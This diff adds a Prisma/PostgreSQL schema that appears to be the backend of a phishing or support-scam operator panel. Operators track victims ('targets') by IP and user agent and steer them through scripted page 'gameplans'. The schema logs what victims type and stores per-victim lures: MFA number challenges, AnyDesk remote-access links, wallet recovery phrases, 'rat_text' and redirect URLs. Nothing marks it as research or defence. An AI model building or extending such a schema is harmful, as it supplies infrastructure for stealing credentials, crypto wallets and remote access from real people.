@@ -1,0 +1,109 @@
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+model operators {
+  id            String   @id @default(cuid())
+  email         String   @unique
+  password_hash String
+  name          String?
+  created_at    DateTime @default(now())
+  updated_at    DateTime @updatedAt
+  targets       targets[]
+}
+
+model domains {
+  id                  String   @id @default(cuid())
+  name                String
+  slug                String   @unique
+  allow_new_visitors  Boolean  @default(true)
+  default_pages       Json?
+  created_at          DateTime @default(now())
+  updated_at          DateTime @updatedAt
+  targets             targets[]
+}
+
+model targets {
+  id               String   @id @default(cuid())
+  status           String?  // pending | active | banned | ended
+  intake_page_name String?
+  useragent        String?
+  owner_group_id   String?
+  ip               String?
+  domain_id        String?
+  operator_id      String?
+  created_at       DateTime @default(now())
+  updated_at       DateTime @updatedAt
+  domain           domains?  @relation(fields: [domain_id], references: [id])
+  operator         operators? @relation(fields: [operator_id], references: [id])
+  intake_states    intake_states[]
+  gameplans        gameplans[]
+  intake_events    intake_events[]
+  target_presets   target_presets[]
+
+  @@index([status])
+}
+
+model target_presets {
+  id              String   @id @default(cuid())
+  target_id       String   @unique
+  number_challenge String?
+  phone_ending    String?
+  anydesk_link    String?
+  recovery_phrase String?
+  it_link         String?
+  rat_text        String?
+  redirect_url    String?
+  created_at      DateTime @default(now())
+  updated_at      DateTime @updatedAt
+  target          targets  @relation(fields: [target_id], references: [id], onDelete: Cascade)
+}
+
+model intake_states {
+  id            String   @id @default(cuid())
+  target_id     String   @unique
+  gameplan_step Int      @default(0)
+  force_load    Boolean  @default(false)
+  created_at    DateTime @default(now())
+  updated_at    DateTime @updatedAt
+  target        targets  @relation(fields: [target_id], references: [id], onDelete: Cascade)
+}
+
+model gameplans {
+  id         String   @id @default(cuid())
+  target_id  String   @unique
+  pages      Json
+  created_at DateTime @default(now())
+  updated_at DateTime @updatedAt
+  target     targets  @relation(fields: [target_id], references: [id], onDelete: Cascade)
+}
+
+model intake_events {
+  id                      String   @id @default(cuid())
+  target_id               String
+  type                    String
+  input_title             String?
+  input_value             String?
+  interaction_title       String?
+  checkpoint_status       String?
+  checkpoint_resolution   String?
+  checkpoint_type         String?
+  checkpoint_dual_outcome String?
+  created_at              DateTime @default(now())
+  updated_at              DateTime @updatedAt
+  target                  targets  @relation(fields: [target_id], references: [id], onDelete: Cascade)
+
+  @@index([target_id, created_at])
+}
+
+model intake_pages {
+  id         String   @id
+  active     Boolean  @default(true)
+  created_at DateTime @default(now())
+  updated_at DateTime @updatedAt
+}
